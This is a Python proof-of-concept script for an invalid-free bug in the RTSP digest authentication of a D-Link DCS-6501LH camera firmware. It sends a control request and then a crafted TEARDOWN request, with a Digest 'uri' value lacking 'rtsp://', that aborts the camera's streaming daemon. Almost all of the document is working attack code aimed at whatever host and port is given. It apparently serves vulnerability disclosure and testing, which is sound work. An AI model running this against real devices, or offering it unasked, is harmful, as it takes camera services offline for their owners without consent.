#!/usr/bin/env python3
"""Proof of concept for the invalid free in the RTSP digest authentication
handling of D-Link DCS-6501LH firmware V3.03.02 (aoni_ipc).

ValidateAuthorizationHeader keeps a pointer into the request buffer when the
Digest "uri" parameter does not contain "rtsp://", then calls free() on it when
the value does not match the session name.  glibc aborts the daemon with
"free(): invalid pointer".

Non-destructive: only RTSP requests are sent; nothing is stored on the device.

Usage:
    python3 poc.py <host> [port]
"""
import socket
import sys

PORT = 554
SESSION = "/live/echoshow/video"


def request(uri_value, cseq):
    url = "rtsp://%s:%d%s" % (HOST, PORT, SESSION)
    auth = ('Digest username="admin", realm="", nonce="n", uri="%s", '
            'response="z"' % uri_value)
    return ("TEARDOWN %s RTSP/1.0\r\nCSeq: %d\r\n"
            "Authorization: %s\r\n\r\n" % (url, cseq, auth)).encode()


def send(payload, read=400):
    sock = socket.create_connection((HOST, PORT), 5)
    try:
        sock.sendall(payload)
        sock.settimeout(5)
        try:
            return sock.recv(read)
        except socket.timeout:
            return b""
    finally:
        sock.close()


def main():
    global HOST, PORT
    HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 554

    print("[*] target %s:%d session %s" % (HOST, PORT, SESSION))

    good = "rtsp://%s:%d%s" % (HOST, PORT, SESSION)
    resp = send(request(good, 1))
    print("[*] control (uri with rtsp://): %r" % resp[:90])
    print("    expected: 401 Unauthorized, service stays up")

    resp = send(request("/x", 2))
    print("[*] trigger (uri without rtsp://): %r" % resp[:90])
    print("    expected: no response; daemon logs 'free(): invalid pointer'")
    print("              and aborts (SIGABRT)")


if __name__ == "__main__":
    HOST = "127.0.0.1"
    main()
